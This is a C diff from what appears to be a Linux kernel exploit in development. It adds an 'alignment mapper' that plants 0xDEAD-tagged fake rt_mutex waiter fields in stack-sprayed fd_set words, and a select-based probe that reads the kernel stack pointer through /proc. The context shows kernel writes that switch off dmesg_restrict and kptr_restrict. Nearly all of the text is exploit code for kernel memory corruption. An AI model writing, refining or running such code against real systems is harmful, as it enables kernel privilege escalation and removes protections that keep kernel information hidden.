@@ -119,6 +119,7 @@ static int pselect_words_per_set(void) {
 }
 
 int pselect_shift_override = -100;
+atomic_int ss_measure_go = 0;
 uintptr_t sc_task_override = 0; /* SC_*: word8 task (0=init_task default) */
 
 static int pselect_put_global_word(
@@ -460,7 +461,29 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
          * leftmost hazard of erasing a node from a tree that already links
          * it. See docs/WALK_DETERMINISM_MASTER_PLAN_2026-08-17.md.
          */
-        if (env_flag("MODE4_STATIC_CHAIN", 0) &&
+        if (env_flag("MODE4_QEMU_MAP", 0)) {
+          /*
+           * ALIGNMENT MAPPER: every waiter word gets a unique tag
+           * 0xDEAD0000_000000ii (ii = fdset word index). The walk's
+           * trylock on waiter->lock faults at the tag it finds there —
+           * the panic fault address names the word index actually
+           * sitting at waiter+0x38. One run = exact alignment truth.
+           */
+          int ph = g_mode4_chain_phase ? g_mode4_chain_phase : 1;
+          (void)ph;
+          uint64_t tail = (uint64_t)data_addr(KIMAGE_TEXT_BASE +
+              (uint64_t)(active_offsets ? active_offsets->off_bss_tail_lock : 0));
+          tree_pc = 0xDEAD0000000000C0ULL + 0x02; /* word2 tag (waiter pc) */
+          tree_r = 0xDEAD0000000000C0ULL + 0x03;
+          tree_l = 0xDEAD0000000000C0ULL + 0x04;
+          pi_parent = 0xDEAD0000000000C0ULL + 0x05;
+          pi_right = 0xDEAD0000000000C0ULL + 0x06;
+          pi_left = 0xDEAD0000000000C0ULL + 0x07;
+          stack_lock = 0xDEAD0000000000C0ULL + 0x09;
+          stack_prio = 3; /* waiter_equal false so the walk proceeds */
+          stack_deadline = 0xDEAD0000000000C0ULL + 0x0B;
+          pr_info("QEMU_MAP tags armed\n");
+        } else if (env_flag("MODE4_STATIC_CHAIN", 0) &&
             env_flag("MODE4_SC_UMASK", 0)) {
           /* Two benign zero-stores to unmask kernel info sources:
            * ph1: *(P0 dmesg_restrict)=0  ph2: *(P0 kptr_restrict)=0
@@ -1931,6 +1954,19 @@ void selfstamp_route(void) {
     atomic_store(&consumer_success, 0);
     atomic_store(&punch_consume_stop, 0);
     atomic_store(&main_route_delay_usec, PSELECT_ENTER_DELAY_USEC);
+    /* SP MEASUREMENT (QEMU_INIT): block 200ms in a real select so
+     * /proc/<tid>/syscall exposes the select-path kernel SP; the MAIN
+     * thread reads and prints it (its stdout works). Comparing with the
+     * panic-dumped waiter address gives the exact fdset-waiter delta. */
+    if (env_flag("QEMU_INIT", 0) && ph == ph_start) {
+      {
+        extern atomic_int ss_measure_go;
+        atomic_store(&ss_measure_go, 1);
+        struct timeval tv200 = {0, 200000};
+        select(PSELECT_ROUTE_NFDS, &in, &out, &ex, &tv200);
+        atomic_store(&ss_measure_go, 0);
+      }
+    }
     atomic_store(&punch_consume_go, ph);
     durable_proof_log("ss_phase_armed");
     if (env_flag("QEMU_INIT", 0)) {
@@ -1993,8 +2029,7 @@ void selfstamp_route(void) {
         select(PSELECT_ROUTE_NFDS, &in, &out, &ex, &tv0);
         if (atomic_load(&consumer_calls) >= 1)
           break;
-        sched_yield(); /* keep kthreads/other threads scheduled under
-                          QEMU TCG (spin otherwise starves the vCPU) */
+
         struct timespec tqn;
         clock_gettime(CLOCK_MONOTONIC, &tqn);
         long el = (tqn.tv_sec - tq0.tv_sec) * 1000000L +
